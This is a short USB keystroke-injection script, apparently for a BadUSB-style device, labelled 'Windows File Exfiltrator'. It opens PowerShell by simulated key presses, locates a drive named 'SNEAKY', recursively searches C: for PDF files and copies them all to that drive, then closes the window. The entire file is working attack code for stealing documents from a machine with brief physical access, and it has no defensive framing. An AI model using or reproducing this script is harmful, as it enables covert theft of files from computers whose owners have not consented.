// Windows File Exfiltrator
// Author: Saytonic https://youtu.be/I_BjCdJlCo4
// Edited by: Coderdude112 on GitHub 
// For config help go to Saytonic's video found here: https://youtu.be/I_BjCdJlCo4
// This attack searches the SearchPath recursivly (All folders and sub-folders) for files that fit the FileTypes

layout('us');			// Set keyboard layout to US
 
press("GUI r");			// Opens a run command
delay(500);
type("powershell\n"); 	// Opens powershell
delay(1000);

var FileTypes = ["*.pdf"] // The file extensions that will be exfiltrated
var SearchPath = ["C:"]	       // The path to look for files NOTE: this will include ALL folders and sub-folders

type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'SNEAKY' } | select name\n"); // Find the drive named "SNEAKY" and save it's path
type("Get-ChildItem " + SearchPath + " -Recurse -Include " + FileTypes + " | ForEach-Object ` {copy $_ -Destination $usbPath.name}\n"); 
// Searches and copies the files that meet the FileTypes variable and copy them to SNEAKY

type("exit\n");  		// Closes out 
